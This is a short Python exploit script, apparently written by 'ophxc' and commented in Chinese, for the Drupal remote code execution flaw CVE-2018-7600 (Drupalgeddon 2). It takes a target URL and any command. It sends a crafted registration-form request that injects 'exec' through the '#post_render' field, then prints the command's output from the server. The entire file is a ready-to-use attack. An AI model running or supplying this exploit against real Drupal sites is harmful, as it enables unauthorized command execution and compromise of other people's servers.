'''
CVE-2018-7600
Drupal Drupalgeddon 2 远程代码执行漏洞
writen by ophxc
'''
import requests
import argparse
import json
import string

parser=argparse.ArgumentParser(description="usage of CVE-2018-7600")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute",required=True)
args=parser.parse_args()

url=args.url
command=args.command
a=url
url='http://'+url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'


data="form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]="+command

proxy = {
    'http': '127.0.0.1:8080'
}

head={
    'Host':a,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded'
}

res=requests.post(url=url,data=data,proxies=proxy,headers=head)
print("Now checking please wait...")
text=res.text[11:-12]
text=json.loads(text)
result=str(text['data'])
if(result == "NULL"):
    print("no exploit")
else:
    print("it's vulnable，and the result is :\n")
    result=str.replace(result,"<span class=\"ajax-new-content\"></span>","")
    print(result)